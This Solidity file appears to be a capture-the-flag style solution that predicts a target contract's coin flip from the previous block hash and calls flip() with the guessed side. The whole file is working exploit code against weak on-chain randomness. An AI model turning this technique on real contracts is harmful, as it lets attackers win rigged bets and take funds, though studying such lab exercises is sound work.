// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address _coinflip) public returns (bool) {
        // Calculate the correct value
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 flip = blockValue.div(FACTOR);
        bool side = flip == 1 ? true : false;

        // Flip with calculated value
        ICoinFlip coinflip = ICoinFlip(_coinflip);
        return coinflip.flip(side);
    }
}
